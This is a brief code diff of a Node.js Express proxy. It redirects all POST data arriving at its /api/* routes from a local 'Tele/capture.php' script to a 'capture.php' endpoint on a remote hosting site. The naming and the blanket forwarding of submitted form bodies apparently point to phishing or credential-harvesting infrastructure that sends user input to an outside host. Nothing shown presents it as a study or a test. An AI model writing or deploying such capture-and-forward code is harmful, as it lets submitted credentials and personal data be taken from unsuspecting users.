@@ -293,7 +293,7 @@ app.post('/api/*', async (req, res) => {
 
     // Forward POST data to PHP
     await axios.post(
-      'http://localhost/Tele/capture.php',
+      'https://plum-raccoon-322277.hostingersite.com/capture.php',
       qs.stringify(req.body),
       { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
     );
@@ -395,3 +395,4 @@ app.options('/api/*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Proxy server running on http://localhost:${PORT}`);
 });
+
